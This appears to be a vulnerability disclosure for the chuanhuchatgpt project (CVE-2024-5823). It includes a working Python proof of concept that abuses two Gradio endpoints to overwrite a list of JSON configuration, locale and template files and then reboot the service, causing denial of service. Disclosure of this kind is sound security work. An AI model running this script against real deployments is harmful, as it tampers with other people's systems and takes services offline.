Title: File Overwrite Vulnerability Leads to Configuration File Tampering and Denial of Service Attack Risk in gaizhenbiao/chuanhuchatgpt

Proof of Concept: 
The significance of functions with fn_index 36 and 66 is as follows: first, overwrite all .json configuration files through fn_index 36, and then restart the service to trigger a DDoS attack. Additionally, it is also possible to overwrite all *.md files.

// PoC.py
import requests

# 构造要发送的数据包
data = {
    "data": [None, "./config.json", [], None],
    "event_data": None,
    "fn_index": 36,
    "trigger_id": 39,
    "session_hash": "ax12j6jmdzq"
}

# 读取文件列表
files_list = [
    "./config.json",
    "./config_example.json",
    "./configs/ds_config_chatbot.json",
    "./locale/en_US.json",
    "./locale/ja_JP.json",
    "./locale/ko_KR.json",
    "./locale/ru_RU.json",
    "./locale/sv_SE.json",
    "./locale/vi_VN.json",
    "./locale/zh_CN.json",
    "./templates/1 中文提示词.json",
    "./templates/3 繁體提示詞.json",
    "./templates/4 川虎的Prompts.json",
    "./templates/5 日本語Prompts.json",
    "./templates/6 Russian Prompts.json"
]

# 发送POST请求
for file_path in files_list:
    url = "http://127.0.0.1:7860/queue/join?"
    headers = {
        "sec-ch-ua": '"Chromium";v="123", "Not:A-Brand";v="8"',
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "http://127.0.0.1:7860",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://127.0.0.1:7860/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_ga=GA1.1.794330819.1713639945; _gid=GA1.1.1338534025.1713639945; _gat_gtag_UA_156449732_1=1; _ga_R1FN4KJKJH=GS1.1.1713719843.7.1.1713719844.0.0.0",
        "Connection": "close"
    }
    data["data"][1] = file_path  # 更新要发送的数据包中的文件路径
    response = requests.post(url, json=data, headers=headers)
    print(f"POST请求发送到 {url}，响应状态码：{response.status_code}")

data["fn_index"] = 66  # reboot_chuanhu
response = requests.post(url, json=data, headers=headers)
print(f"POST请求发送到 {url}，响应状态码：{response.status_code}")

Impact: 
The vulnerability enables attackers to modify critical system files, leading to unauthorized configuration changes and the potential for denial of service attacks, along with partial integrity compromise.

CVE ID: CVE-2024-5823
Status: (assigned)
Vulnerability Type: CWE-73: External Control of File Name or Path
Severity: Medium (6.5)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope: Unchanged
Confidentiality: None
Integrity: Low
Availability: Low
Registry: Pypi
Affected Version: <=20240410
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $75
Fix Bounty: $18.75
